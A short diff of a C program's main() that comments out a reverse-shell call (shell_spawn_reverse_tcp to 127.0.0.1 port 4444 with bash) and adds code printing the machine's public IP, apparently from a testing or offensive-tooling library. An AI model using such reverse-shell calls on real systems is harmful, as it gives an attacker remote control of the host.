@@ -25,6 +25,9 @@ void help_menu(){
 
 int main(){
   help_menu();
-  shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
+  //shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
+  char public_ip[MAX_DOMAIN_LEN];
+  sys_public_ip(public_ip, MAX_DOMAIN_LEN);
+  printf("%s\n", public_ip);
   return 0;
 }
